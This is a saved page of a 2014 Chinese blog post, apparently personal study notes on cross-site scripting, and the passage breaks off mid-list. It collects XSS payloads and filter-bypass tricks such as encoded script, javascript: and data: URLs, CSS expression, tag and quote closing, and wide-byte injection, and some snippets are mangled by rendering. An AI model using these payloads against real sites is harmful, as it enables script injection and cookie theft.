@@ -1,0 +1,622 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+<head>
+  <meta charset="UTF-8">
+  <title>XSS零碎指南 | 小胡子哥的个人网站</title>
+  <meta name="HandheldFriendly" content="True" />
+  <meta name="viewport" content="width=device-width,height=device-height,initial-scale=1,user-scalable=0">
+  <meta name="author" content="https://plus.google.com/112634278852964994392?hl=zh-cn">
+  <meta name="email" content="barret.china@gmail.com">
+  <meta name="description" content="该文章是本人两天的学习笔记，共享出来，跟大家交流。知识比较零散，但是对有一定 JS 基础的人来说，每个小知识都有助于开阔你的 Hack 视角。首先声明，本文只是 XSS 攻击的冰山一角，读者自行深入研究。一、XSS学习提要http://qdemo.sinaapp.com/ppt/xss/ 三水清 简单介">
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="XSS零碎指南 | 小胡子哥的个人网站">
+  <meta property="og:url" content="https://www.barretlee.com/blog/2014/05/01/cb-xss-snippets/">
+  <meta property="og:site_name" content="XSS零碎指南">
+  <meta property="og:description" content="该文章是本人两天的学习笔记，共享出来，跟大家交流。知识比较零散，但是对有一定 JS 基础的人来说，每个小知识都有助于开阔你的 Hack 视角。首先声明，本文只是 XSS 攻击的冰山一角，读者自行深入研究。一、XSS学习提要http://qdemo.sinaapp.com/ppt/xss/ 三水清 简单介">
+  <meta name="generator" content="https://hexo.io" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <meta name="renderer" content="webkit">
+  <link href="https://img.alicdn.com/imgextra/i4/O1CN01LKRotr20M1ZGJkT3v_!!6000000006834-2-tps-1200-1200.png" rel="apple-touch-icon-precomposed">
+  <link rel="shoticon" href="https://img.alicdn.com/imgextra/i3/O1CN01EVx62B1eyZLyJsJnY_!!6000000003940-2-tps-100-100.png" type="image/x-icon">
+  <link rel="alternate" type="application/rss+xml" href="https://www.barretlee.com/rss2.xml" title="小胡子哥的个人网站" />
+  <link rel="prev" href="https://www.barretlee.com/blog/2014/05/02/cb-ecmascript6-overview/" title="ECMAScript 6入门" />
+  <link rel="next" href="https://www.barretlee.com/blog/2014/04/30/previous-element-with-css/" title="css选中前一个元素" />
+  <link rel="start" href="https://www.barretlee.com/entry/" title="Blog Entry" />
+  <link rel="stylesheet" href="https://fastly.jsdelivr.net/gh/barretlee/blog@gh-pages/public/css/style-20230627-2.css">
+</head>
+
+
+<body>
+  <div class="rainbow"></div>
+  <div class="container">
+  <span class="local-search local-search-google local-search-plugin" style="display: none;">
+  <input type="search" placeholder="站内搜索" id="local-search-input" class="local-search-input-cls" style="">
+  <i class="icon" aria-hidden="true" title="点击进入 Google 搜索">&#x2708;</i>
+  <div id="local-search-result" class="local-search-result-cls"></div>
+</span>
+  <div class="article" itemscope itemtype="http://schema.org/Article">
+    <div class="post">
+      <div class="bread">
+        <a href="/">小胡子哥的个人网站</a> »
+        <a href="/entry/">博客</a> »
+        
+	<a class="category-link" href="/blog/categories/JavaScript/">JavaScript</a>,<a class="category-link" href="/blog/categories/JavaScript/%E5%89%8D%E7%AB%AF%E6%9D%82%E7%83%A9/">前端杂烩</a>
+
+
+      </div>
+      <div class="post-title-wrapper">
+        <h1 class="post-title" itemprop="name">XSS零碎指南</h1>
+        <a href="/about/"><img style="max-width:120px" src="https://img.alicdn.com/imgextra/i1/O1CN01zmj6R326ehPa0NZO2_!!6000000007687-2-tps-1200-1200.png" alt="Barret李靖" /></a>
+      </div>
+      <div class="post-info">
+        <span>作者: <a href="/about/">Barret李靖</a></span>
+        <span>
+          <time itemprop="timeCreated" aria-hidden="true">2014-05-01 12:59:00</time>
+          <span class="aria-readonly">本文发布时间为2014年05月01日12时59分00秒</span>
+        </span>
+        
+        <span>分类: 
+	<a class="category-link" href="/blog/categories/JavaScript/">JavaScript</a>,<a class="category-link" href="/blog/categories/JavaScript/%E5%89%8D%E7%AB%AF%E6%9D%82%E7%83%A9/">前端杂烩</a>
+
+</span>
+        
+        
+        <span tabindex="0" aria-hidden="true">标签: 
+<a class="article-tag-none-link" href="/blog/tags/XSS/" rel="tag">XSS</a>, <a class="article-tag-none-link" href="/blog/tags/cnblogs/" rel="tag">cnblogs</a>
+</span>
+        
+        <span class="aria-readonly">下面是正文内容</span>
+        <span tabindex="0" aria-hidden="true">评论数: <a href="#comments"
+                      class="ds-thread-count hash-to-comments disqus-comment-count"
+                      data-thread-key="cb-xss-snippets"
+                      data-disqus-identifier="cb-xss-snippets"></a></span>
+      </div>
+      <div class="post-content" itemprop="articleBody">
+        
+        <p>该文章是本人两天的学习笔记，共享出来，跟大家交流。知识比较零散，但是对有一定 JS 基础的人来说，每个小知识都有助于开阔你的 Hack 视角。首先声明，本文只是 XSS 攻击的冰山一角，读者自行深入研究。</p>
+<h3>一、XSS学习提要</h3>
+<ol>
+<li><a  target="_blank" href="http://qdemo.sinaapp.com/ppt/xss/" target="_blank">http://qdemo.sinaapp.com/ppt/xss/</a> 三水清 简单介绍 xss</li>
+<li><a  target="_blank" href="http://drops.wooyun.org/tips/689" target="_blank">http://drops.wooyun.org/tips/689</a> 乌云 xss与字符编码</li>
+<li><a  target="_blank" href="http://www.wooyun.org/whitehats/%E5%BF%83%E4%BC%A4%E7%9A%84%E7%98%A6%E5%AD%90" target="_blank">http://www.wooyun.org/whitehats/心伤的瘦子</a> 系列教程</li>
+<li><a  target="_blank" href="http://ha.ckers.org/xss.html" target="_blank">http://ha.ckers.org/xss.html</a> 反射性XSS详细分析和解释</li>
+<li><a  target="_blank" href="http://html5sec.org/" target="_blank">http://html5sec.org/</a> 各种技巧 ★★★★★</li>
+
+</ol>
+<h3>二、XSS攻击要点</h3>
+<p><strong>注意：</strong>这些插入和修改都是为了避开浏览器自身的过滤，或者开发者认为的过滤。</p>
+<p><strong>1. JS函数。</strong></p>
+<p>document.write innerHTML eval setTimeout/setInterval等等都是很多XSS攻击注入的入口</p>
+<p><strong>2. html实体编码</strong></p>
+
+<figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line">&gt; <span class="string">&quot;alert(&quot;</span>Barret李靖<span class="string">&quot;)&quot;</span>.<span class="built_in">replace</span>(<span class="regexp">/./g</span>, <span class="keyword">function</span>(<span class="params">s</span>)&#123;</span><br><span class="line">     <span class="keyword">return</span> <span class="string">&quot;&lt;#&quot;</span> + s.charCodeAt(<span class="number">0</span>)</span><br><span class="line">      <span class="comment">/*.toString(16) 转换成16进制也可以滴*/</span></span><br><span class="line">      + <span class="string">&quot;;&quot;</span></span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">&gt; <span class="string">&quot;&lt;#97;&lt;#108;&lt;#101;&lt;#114;&lt;#116;&lt;#40;&lt;#49;&lt;#41;&quot;</span></span><br><span class="line"></span><br><span class="line">&lt;img src=<span class="string">&quot;x&quot;</span> onerror=<span class="string">&quot;&lt;#97;&lt;#108;&lt;#101;&lt;#114;&lt;#116;&lt;#40;&lt;#49;&lt;#41;&quot;</span>&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><strong>3. 如果过滤 html 实体编码，可以改成URL编码</strong></p>
+
+<figure class="highlight node-repl"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">&gt;</span> <span class="language-javascript"><span class="built_in">encodeURIComponent</span>(<span class="string">&quot;&lt;#&quot;</span>)</span></span><br><span class="line"><span class="meta prompt_">&gt;</span> <span class="language-javascript"><span class="string">&quot;%26%23&quot;</span></span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><strong>4. 利用 HTML5 新增字符</strong></p>
+
+<figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line">&lt;colon<span class="comment">; 冒号</span></span><br><span class="line">&lt;NewLine<span class="comment">; 换行</span></span><br><span class="line"></span><br><span class="line">&lt;a href<span class="operator">=</span><span class="string">&quot;javascr&lt;NewLine;ipt&lt;colon;alert(&quot;</span> barret李靖<span class="string">&quot;)&quot;</span><span class="operator">=</span><span class="string">&quot;&quot;</span>&gt;XSS&lt;/a&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><strong>5. JS进制转换</strong></p>
+
+<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">&gt; <span class="string">&quot;<span class="char escape_">\74</span><span class="char escape_">\16</span>3<span class="char escape_">\14</span>3<span class="char escape_">\16</span>2<span class="char escape_">\15</span>1<span class="char escape_">\16</span>0<span class="char escape_">\16</span>4<span class="char escape_">\76</span><span class="char escape_">\14</span>1<span class="char escape_">\15</span>4<span class="char escape_">\14</span>5<span class="char escape_">\16</span>2<span class="char escape_">\16</span>4<span class="char escape_">\50</span><span class="char escape_">\61</span><span class="char escape_">\51</span><span class="char escape_">\74</span><span class="char escape_">\57</span><span class="char escape_">\16</span>3<span class="char escape_">\14</span>3<span class="char escape_">\16</span>2<span class="char escape_">\15</span>1<span class="char escape_">\16</span>0<span class="char escape_">\16</span>4<span class="char escape_">\76</span>&quot;</span></span><br><span class="line">&gt; <span class="string">&quot;&lt;script&gt;alert(&quot;</span>Barret李靖<span class="string">&quot;)&lt;/script&gt;&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><strong>6. Base64转换</strong></p>
+
+<figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line">&gt; base64(<span class="string">&quot;&lt;script&gt;alert(&quot;</span>Barret李靖<span class="string">&quot;)&lt;/script&gt;&quot;</span>)<span class="comment">;</span></span><br><span class="line">&gt; PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg<span class="operator">=</span><span class="operator">=</span></span><br><span class="line"></span><br><span class="line">&lt;a href<span class="operator">=</span><span class="string">&quot;data:text/html;base64, PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;</span>&gt;XSS&lt;/a&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><strong>7. 浏览器解析非严格性</strong></p>
+
+<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">&lt;img <span class="attribute">src</span>=<span class="string">&quot;image.jpg&quot;</span> <span class="attribute">title</span>=<span class="string">&quot;Hello World&quot;</span> <span class="attribute">class</span>=<span class="string">&quot;test&quot;</span>&gt;</span><br><span class="line">  ↓ ↓    ↓        ↓      ↓            ↓</span><br><span class="line">  ①②   ③        ④     ⑤           ⑥</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>①中可插入 NUL字符（0x00）</p>
+<p>②和④中空格可以使用 tab（0x0B）与换页键（0x0C），</p>
+<p>②还可以使用 / 替换</p>
+<p>⑤中的"在IE中也可替换成`。</p>
+
+<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">   位置      |        代码               | 可能插入或替代的代码</span><br><span class="line">------------|---------------------------|-----------------------</span><br><span class="line">&lt;的右边 |=<span class="string">&quot;&quot;</span> &lt;[here]<span class="attribute">a</span>=<span class="string">&quot;&quot;</span> <span class="attribute">href</span>=<span class="string">&quot;...        | 控制符，空白符，非打印字符</span></span><br><span class="line"><span class="string">a标签的后门  | &lt;a[here]href=&quot;</span> <span class="built_in">..</span>.=<span class="string">&quot;&quot;</span> 同上=<span class="string">&quot;&quot;</span> href属性中间=<span class="string">&quot;&quot;</span> &lt;<span class="attribute">a</span>=<span class="string">&quot;&quot;</span> hr[here]<span class="attribute">ef</span>=<span class="string">&quot;...        | 同上+空字节</span></span><br><span class="line"><span class="string">=两边       | &lt;a href[here]=[here]&quot;</span> 所有字符=<span class="string">&quot;&quot;</span> 替换=<span class="string">&quot;|&quot;</span> href[here]<span class="string">&quot;...=&quot;</span><span class="string">&quot; union编码符号=&quot;</span><span class="string">&quot; 替换&quot;</span>=<span class="string">&quot;&quot;</span>&gt;    | 其他引号</span><br><span class="line">&gt;之前       | &lt;a <span class="attribute">href</span>=<span class="string">&quot;...&quot;</span> [here]=<span class="string">&quot;&quot;</span>&gt;        | 任意字符</span><br><span class="line">/之前       | &lt;a <span class="attribute">href</span>=<span class="string">&quot;...&quot;</span>&gt;...&lt;[here] <span class="attribute">a</span>=<span class="string">&quot;&quot;</span>&gt; | 空白符，控制符</span><br><span class="line">/之后       | &lt;a <span class="attribute">href</span>=<span class="string">&quot;...&quot;</span>&gt;... | 空白符，控制符</span><br><span class="line">&gt;闭合之前    | &lt;a <span class="attribute">href</span>=<span class="string">&quot;...&quot;</span>&gt;...  | 所有字符</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p></a></a>&lt;&#x2F;[here]&gt;</a></a>&lt;&#x2F;的右边&gt;</p>
+<p><strong>8. 斜杠</strong></p>
+<p>在字符串中斜杠（/）可以用于转义字符，比如转义 " 和 ' ，双斜杠（//）可以用来注释。这样可以很轻松的改变之前的语句，注入内容。</p>
+<p><strong>9. 空格的处理方式</strong></p>
+<p>在解析的时候空格被转移成 <code><nbsp;</code>,注入的时候可以使用 <code>/**/</code>来替换。</p>
+<p><strong>10. 特殊属性</strong></p>
+<p>1）srcdoc属性（chrome有效）</p>
+
+<figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line">&lt;iframe srcdoc<span class="operator">=</span><span class="string">&quot;&lt;lt;script&lt;gt;alert(&quot;</span> barret李靖<span class="string">&quot;)&lt;lt;=&quot;</span><span class="string">&quot; script&lt;gt;&quot;</span><span class="operator">=</span><span class="string">&quot;&quot;</span>&gt;&lt;/iframe&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>2）autofoucus</p>
+
+<figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line">&lt;input onfocus<span class="operator">=</span><span class="string">&quot;write(1)&quot;</span> autofocus&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>3）object</p>
+
+<figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line">&lt;object classid<span class="operator">=</span><span class="string">&quot;clsid:333c7bc4-460f-11d0-bc04-0080c7055a83&quot;</span>&gt;</span><br><span class="line">    &lt;param name<span class="operator">=</span><span class="string">&quot;dataurl&quot;</span> value<span class="operator">=</span><span class="string">&quot;javascript:alert(&quot;</span> barret李靖<span class="string">&quot;)&quot;</span><span class="operator">=</span><span class="string">&quot;&quot;</span>&gt;</span><br><span class="line">&lt;/object&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><strong>11.绕过浏览器过滤（crhome）</strong></p>
+
+<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">?<span class="attribute">t</span>=<span class="string">&quot;&gt;&lt;img src=&quot;</span>1&quot; <span class="attribute">onerror</span>=<span class="string">&quot;alert(&quot;</span>Barret李靖&quot;)&quot;&gt;</span><br><span class="line">&lt;input <span class="attribute">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attribute">id</span>=<span class="string">&quot;sClientUin&quot;</span> <span class="attribute">value</span>=<span class="string">&quot;&quot;</span>&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>浏览器会过滤onerror中的代码，所以换种方式注入</p>
+
+<figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">?t=<span class="string">&quot;&gt;&lt;script src=&quot;</span>data:<span class="built_in">text</span>/html,&lt;<span class="keyword">script</span>&gt;alert(<span class="string">&quot; barret李靖&quot;</span>)&lt;=<span class="string">&quot;&quot;</span> <span class="keyword">script</span>=<span class="string">&quot;&quot;</span>&gt;&lt;!<span class="comment">--</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p></script></p>
+<p>chrome拦截，是有一定的拦截规则的，只有它觉得是恶意代码的才会去拦截。</p>
+<p><strong>12.替换URL</strong></p>
+
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">xss</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"><span class="selector-class">.xss</span>&#123;<span class="attribute">background-image</span>:<span class="built_in">url</span>(<span class="string">&quot;javascript:alert(&#x27;xss&#x27;)&quot;</span>);&#125;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&quot;xss&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span><span class="language-css"><span class="selector-tag">body</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">&quot;javascript:alert(&#x27;xss&#x27;)&quot;</span>)&#125;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+</xss>
+<p><strong>13.抓包、换包</strong></p>
+
+
+<h3>三、XSS攻击方式</h3>
+<p><strong>1. javascript:和vbscript:协议执行后的结果将会映射在DOM</strong>后面。</p>
+
+<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">&lt;<span class="keyword">a</span> href=<span class="string">&quot;javascript:&#x27;\x3cimg src\x3dx onerror=alert(&quot;</span> barret李靖<span class="string">&quot;)=&quot;</span><span class="string">&quot;&gt;&#x27;&quot;</span>&gt;click me&lt;/<span class="keyword">a</span>&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><strong>2. 变量覆盖</strong></p>
+
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">&quot;location&quot;</span> <span class="attr">href</span>=<span class="string">&quot;bar&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(location.href)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+</form>
+<p><strong>3. meta标签</strong></p>
+
+<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">&lt;meta <span class="attribute">http-equiv</span>=<span class="string">&quot;refresh&quot;</span> <span class="attribute">content</span>=<span class="string">&quot;0; url=javascript:alert(document.domain)&quot;</span>&gt;</span><br><span class="line">Javascript: 协议可能被禁止，可以使用 data:</span><br><span class="line">&lt;meta <span class="attribute">http-equiv</span>=<span class="string">&quot;refresh&quot;</span> <span class="attribute">content</span>=<span class="string">&quot;0; url=data:text/html,&lt;script&gt;alert(&quot;</span> barret李靖<span class="string">&quot;)&lt;=&quot;</span><span class="string">&quot; script=&quot;</span><span class="string">&quot;&gt;&quot;</span>&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><strong>4. css注入</strong></p>
+
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="keyword">@import</span> <span class="string">&quot;data:,*%7bx:expression(write(1))%7D&quot;</span>;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="keyword">@imp</span>\ ort<span class="string">&quot;data:,*%7b- = \a %65x\pr\65 ssion(write(2))%7d&quot;</span>; </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;Stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;data:,*%7bx:expression(write(3))%7d&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span></span><br></pre></td></tr></table></figure>
+<p></style></p>
+<p><strong>5. 提前闭合标签</strong></p>
+
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">http://example.com/test.php?callback=cb</span><br><span class="line"></span><br><span class="line">缺陷代码：</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="property">domain</span>=<span class="string">&#x27;soso.com&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">    _ret=&#123;<span class="string">&quot;_res&quot;</span>:<span class="number">2</span>&#125;;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">try</span>&#123;</span></span><br><span class="line"><span class="language-javascript">        parent.<span class="title function_">aaa</span>(_ret);</span></span><br><span class="line"><span class="language-javascript">    &#125;<span class="keyword">catch</span>(err)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">aaa</span>(_ret);</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">注入：http://example.com/test.php?callback=cb<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;XSS&quot;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><strong>原理：</strong>cb为回调函数，如果后端并没有对callback字段进行过滤，则可以<code>cb&lt;/script&gt;&lt;script&gt;alert("XSS")&lt;/script&gt;</code>这么长的一串作为函数名，然后你就懂啦~ 本方式只针对上面有缺陷的代码。</p>
+<p><strong>6. 提前闭合双引号</strong></p>
+
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">value</span>=<span class="string">&quot;XSS&lt;quot; onclick=&lt;quot;alert(&quot;</span> <span class="attr">barret李靖</span>&quot;)&quot;=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--&lt;img src=&quot;--&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;alert(&quot;</span><span class="attr">Barret李靖</span>&quot;)//&quot;&quot;&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">comment</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;&lt;/comment&gt;&lt;img src=x onerror=alert(&quot;</span> <span class="attr">barret李靖</span>&quot;)=<span class="string">&quot;&quot;</span> &quot;=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">&lt;![&gt;<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;]&gt;&lt;img src=x onerror=alert(&quot;</span> <span class="attr">barret李靖</span>&quot;)=<span class="string">&quot;&quot;</span> &quot;=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span>&lt;img src=&quot;<span class="tag">&lt;/<span class="name">style</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;alert(&quot;</span><span class="attr">Barret李靖</span>&quot;)//&quot;&quot;&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+</comment>
+<p><strong>7. 阻止编码</strong></p>
+
+<figure class="highlight excel"><table><tr><td class="code"><pre><span class="line">?<span class="built_in">t</span>=;alert(<span class="string">&quot;Barret李靖&quot;</span>)</span><br><span class="line">&lt;script <span class="built_in">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">    <span class="built_in">var</span> <span class="built_in">t</span> = query(<span class="built_in">t</span>); // <span class="built_in">t</span> = <span class="string">&quot;&lt;quot;;alert(&quot;</span>Barret李靖<span class="string">&quot;)&quot;</span></span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>上面可以看到 ";" 被编码了，观察页面编码：</p>
+
+<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">&lt;meta <span class="attribute">http-equiv</span>=<span class="string">&quot;Content-Type&quot;</span> <span class="attribute">content</span>=<span class="string">&quot;text/html; charset=gb18030&quot;</span>&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>gbxxx系列编码，可以尝试宽字节：</p>
+
+<figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line">?t=<span class="meta">%</span>c<span class="number">0</span><span class="meta">%</span><span class="number">22</span>alert<span class="comment">(&quot;Barret李靖&quot;)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><strong>8. 攻击单行注释</strong></p>
+<p>URL对应的param中添加换行符（%0a）或者其他换行符。</p>
+
+<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">?t=%0aalert(<span class="string">&quot;Barret李靖&quot;</span>)//</span><br><span class="line"></span><br><span class="line"><span class="regexp">//</span> init(<span class="string">&#x27;id&#x27;</span>, <span class="string">&quot;%0aalert(&quot;</span>Barret李靖<span class="string">&quot;)//&quot;</span>);</span><br><span class="line"></span><br><span class="line">被解析成</span><br><span class="line"></span><br><span class="line">// init(<span class="string">&#x27;id&#x27;</span>, <span class="string">&quot;</span></span><br><span class="line"><span class="string">alert(&quot;</span>Barret李靖<span class="string">&quot;)//&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><strong>9. url</strong></p>
+<p>url中可以使用很多协议 http:// // javascript: vbscript: data:等等，利用这些属性，可以找到很多的空隙。</p>
+
+<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">&lt;<span class="keyword">a</span> href=<span class="string">&quot;data:text/html,&lt;script&gt;alert(&quot;</span> barret李靖<span class="string">&quot;)&lt;=&quot;</span><span class="string">&quot; script=&quot;</span><span class="string">&quot;&gt;&quot;</span>&gt;XSS&lt;/<span class="keyword">a</span>&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><strong>10. Flash跨域注入</strong></p>
+<p>这个我不太熟悉，现在网页上Flash用的越来越少了，懒得继续看了。</p>
+<p><strong>11. 利用事件</strong></p>
+
+<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">&lt;iframe <span class="attribute">src</span>=<span class="string">&quot;#&quot;</span> <span class="attribute">onmouseover</span>=<span class="string">&quot;alert(document.cookie)&quot;</span>&gt;&lt;/iframe&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><strong>12. 利用标签</strong></p>
+
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">background</span>=<span class="string">&quot;javascript:alert(&#x27;xss&#x27;)&quot;</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+</td></table>
+
+
+<h3>四、XSS攻击实质</h3>
+<p>XSS攻击没太多神奇的地方，就是利用浏览器防御不周到或者开发者代码不健壮，悄悄对页面或者服务器进行攻击。</p>
+<p><strong>1. 绕过过滤</strong></p>
+<p>URL中的 <code>&lt;</code>，在DOM XSS中，可以使用 \u003c (unicode编码)表示，不过他有可能被过滤了，最后解析成<code><lt;</code>，也可以使用 \x3c (Javascript 16进制编码)，<code>&gt;</code> 对应使用 \x3e。这种情况经常在 innerHTML 以及 document.write 中用到。</p>
+<p>所谓的过滤包括人工过滤，也包括了浏览器HTML与JavaScript本身的过滤，程序员会在浏览器本身过滤过程中进行一些干扰和修改，这几个流程都给我们提供了很多 xss 攻击的入口。</p>
+<p>1) 数据需要过滤，但是未过滤。导致XSS。比如：昵称、个人资料。</p>
+<p>2) 业务需求使得数据只能部分过滤，但过滤规则不完善，被绕过后导致XSS。比如：日志、邮件及其它富文本应用。</p>
+<p><strong>2. 利用源码中js的解析</strong></p>
+<p>比如第二部分提出的第11点，浏览器的拦截</p>
+
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">?t=&quot;&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;Barret李靖&quot;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这样的插入会被拦截，当你发现源码中有这么一句话的时候：</p>
+
+<figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">parseURL</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    t.<span class="built_in">replace</span>(<span class="string">&quot;WOW&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="comment">//..</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>便可以修改如上参数：</p>
+
+<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">?<span class="attribute">t</span>=<span class="string">&quot;&gt;&lt;scrwowipt&gt;alert(&quot;</span>Barret李靖&quot;)&lt;/scrwowipt&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>直接绕过了chrome浏览器对危险代码的防御。</p>
+<h3>五、学会XSS攻击</h3>
+<p><strong>1. 寻找可控参数</strong></p>
+<p>攻击入口在哪里？一般是有输入的地方，比如URL、表单、交互等。</p>
+<ul>
+<li>含参数的URL中找到参数 value 值的输出点，他可能在html中输入，也可能是在javascript中</li>
+<li>实验各种字符（&lt; , &gt; " '等），判断是否被过滤，测试方式，手动输入测试</li>
+<li>确定可控范围，是否可以使用unicode编码绕过，是否可以使用HTML编码绕过，是否可以使用Javascript进制编码绕过等等</li>
+</ul>
+<p><strong>2. 开始注入</strong></p>
+<p>注入细节上面都是，基本的思维模式：</p>
+<ul>
+<li>覆盖</li>
